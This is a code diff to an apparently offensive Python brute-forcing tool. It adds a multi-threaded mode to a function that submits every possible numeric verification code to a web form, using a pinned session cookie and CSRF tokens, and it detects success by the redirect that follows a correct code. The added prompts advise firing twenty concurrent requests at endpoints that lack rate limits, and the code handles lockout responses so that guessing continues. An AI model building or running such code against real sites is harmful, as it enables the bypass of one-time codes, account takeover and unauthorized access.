@@ -10,7 +10,9 @@ import sys
 import socket
 import ftplib
 import os
+import threading
 from collections import Counter
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 try:
     import paramiko
@@ -804,7 +806,7 @@ def parse_cookie_string(cookie_string):
 
 
 def numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
-                            delay, refresh_csrf):
+                            delay, refresh_csrf, threads=1):
     """
     code_url     : the endpoint that both serves the code page (GET, to grab
                    a CSRF token) and accepts the submission (POST).
@@ -813,6 +815,13 @@ def numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
     digits       : code length; range is 0 .. 10**digits - 1, zero-padded.
     refresh_csrf : if True, re-fetch a fresh CSRF token before every POST
                    (slower, needed if the app rotates tokens per request).
+                   Ignored when threads > 1 (a per-request token can't be
+                   shared across concurrent workers -- a static session
+                   token is used instead).
+    threads      : concurrent workers. 1 = sequential. >1 fires that many
+                   requests at once and stops the moment one succeeds. Only
+                   safe on endpoints that do NOT rate-limit (an unthrottled
+                   code field) -- concurrency trips a rate limit instantly.
     """
     print(colored("\n[*] Starting cookie-pinned numeric code brute-force...", 'cyan'))
 
@@ -874,46 +883,132 @@ def numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
 
     total = 10 ** digits
     print(colored(f"[*] Brute-forcing {total} codes ({digits}-digit, zero-padded)", 'cyan'))
+
+    def is_success(response):
+        if is_blocked_response(response.text):
+            return False
+        return len(response.history) > 0 and \
+            response.url.rstrip('/') != action.rstrip('/') and \
+            response.url.rstrip('/') != code_url.rstrip('/')
+
+    # ---- Sequential path ----
+    if threads <= 1:
+        print(colored(f"[*] Mode: sequential (1 worker)", 'cyan'))
+        print(colored(f"[*] Started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+        print(colored("=" * 55, 'cyan'))
+
+        for n in range(total):
+            code = str(n).zfill(digits)
+
+            if refresh_csrf and csrf_field:
+                csrf_value = current_csrf()
+
+            data = {code_field: code}
+            if csrf_field and csrf_value is not None:
+                data[csrf_field] = csrf_value
+
+            sys.stdout.write(colored(f"\r  [*] Trying ({n + 1}/{total}): {code}", 'red'))
+            sys.stdout.flush()
+
+            try:
+                response = session.post(action, data=data, timeout=10, allow_redirects=True)
+                time.sleep(delay)
+            except requests.exceptions.ConnectionError:
+                print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
+                time.sleep(5)
+                continue
+            except requests.exceptions.Timeout:
+                continue
+
+            if is_blocked_response(response.text):
+                print(colored(f"\n[!] Block/lockout detected at code {code} -- pausing 5s", 'yellow'))
+                time.sleep(5)
+                continue
+
+            if is_success(response):
+                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+                print(colored(f"  [+] Code: {code}", 'green'))
+                print(colored(f"  [+] Landed on: {response.url}", 'green'))
+                return code
+
+        print(colored(f"\n\n[-] Code brute-force complete -- no valid code found", 'red'))
+        return None
+
+    # ---- Threaded path ----
+    if refresh_csrf and csrf_field:
+        print(colored("[!] Per-request CSRF refresh is not supported with threads -- "
+                       "using the static session token instead.", 'yellow'))
+
+    print(colored(f"[*] Mode: threaded ({threads} workers)", 'cyan'))
     print(colored(f"[*] Started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
     print(colored("=" * 55, 'cyan'))
 
-    for n in range(total):
+    found = {'code': None, 'url': None}
+    found_event = threading.Event()
+    progress = {'done': 0}
+    progress_lock = threading.Lock()
+
+    # Each worker reuses the pinned cookie jar in its own session so the
+    # threads don't share/mutate one requests.Session concurrently.
+    thread_local = threading.local()
+
+    def worker_session():
+        s = getattr(thread_local, 'session', None)
+        if s is None:
+            s = requests.Session()
+            s.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            })
+            for nm, val in jar.items():
+                s.cookies.set(nm, val)
+            thread_local.session = s
+        return s
+
+    def try_code(n):
+        if found_event.is_set():
+            return None
         code = str(n).zfill(digits)
-
-        if refresh_csrf and csrf_field:
-            csrf_value = current_csrf()
-
         data = {code_field: code}
         if csrf_field and csrf_value is not None:
             data[csrf_field] = csrf_value
-
-        sys.stdout.write(colored(f"\r  [*] Trying ({n + 1}/{total}): {code}", 'red'))
-        sys.stdout.flush()
-
         try:
-            response = session.post(action, data=data, timeout=10, allow_redirects=True)
-            time.sleep(delay)
-        except requests.exceptions.ConnectionError:
-            print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
-            time.sleep(5)
-            continue
-        except requests.exceptions.Timeout:
-            continue
+            response = worker_session().post(action, data=data, timeout=10,
+                                              allow_redirects=True)
+            if delay:
+                time.sleep(delay)
+        except requests.exceptions.RequestException:
+            return None
+        finally:
+            with progress_lock:
+                progress['done'] += 1
+                if progress['done'] % 50 == 0 or progress['done'] == total:
+                    sys.stdout.write(colored(
+                        f"\r  [*] Tried {progress['done']}/{total} (last: {code})", 'red'))
+                    sys.stdout.flush()
 
-        if is_blocked_response(response.text):
-            print(colored(f"\n[!] Block/lockout detected at code {code} -- pausing 5s", 'yellow'))
-            time.sleep(5)
-            continue
-
-        # Success = redirected away from the code page.
-        redirected = len(response.history) > 0 and \
-                     response.url.rstrip('/') != action.rstrip('/') and \
-                     response.url.rstrip('/') != code_url.rstrip('/')
-        if redirected:
-            print(colored(f"\n\n  [+] SUCCESS!", 'green'))
-            print(colored(f"  [+] Code: {code}", 'green'))
-            print(colored(f"  [+] Landed on: {response.url}", 'green'))
+        if is_success(response):
+            found['code'] = code
+            found['url'] = response.url
+            found_event.set()
             return code
+        return None
+
+    with ThreadPoolExecutor(max_workers=threads) as pool:
+        futures = []
+        for n in range(total):
+            if found_event.is_set():
+                break
+            futures.append(pool.submit(try_code, n))
+        for fut in as_completed(futures):
+            if fut.result():
+                found_event.set()
+                break
+
+    if found['code'] is not None:
+        print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+        print(colored(f"  [+] Code: {found['code']}", 'green'))
+        print(colored(f"  [+] Landed on: {found['url']}", 'green'))
+        return found['code']
 
     print(colored(f"\n\n[-] Code brute-force complete -- no valid code found", 'red'))
     return None
@@ -1187,10 +1282,21 @@ def main():
             "[*] Re-fetch a fresh CSRF token before every attempt? "
             "(slower; only if the app rotates tokens) (y/n, default n): ",
             'cyan')).strip().lower() == 'y'
-        delay = input(colored("[*] Delay between attempts (default 0.3): ", 'cyan'))
-        delay = float(delay) if delay.strip() else 0.3
+        threads_input = input(colored(
+            "[*] Concurrent threads (1 = sequential; try 20 on an unthrottled "
+            "endpoint; default 1): ", 'cyan')).strip()
+        threads = int(threads_input) if threads_input else 1
+        if threads > 1:
+            print(colored(
+                "[!] Threaded mode fires many requests at once -- fast on an "
+                "unthrottled code field, but it will trip a rate limit or "
+                "lockout instantly on targets that have one.", 'yellow'))
+        default_delay = 0.0 if threads > 1 else 0.3
+        delay = input(colored(
+            f"[*] Delay between attempts (default {default_delay}): ", 'cyan'))
+        delay = float(delay) if delay.strip() else default_delay
         numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
-                                delay, refresh)
+                                delay, refresh, threads)
 
     else:
         print(colored("[-] Invalid mode selected", 'red'))
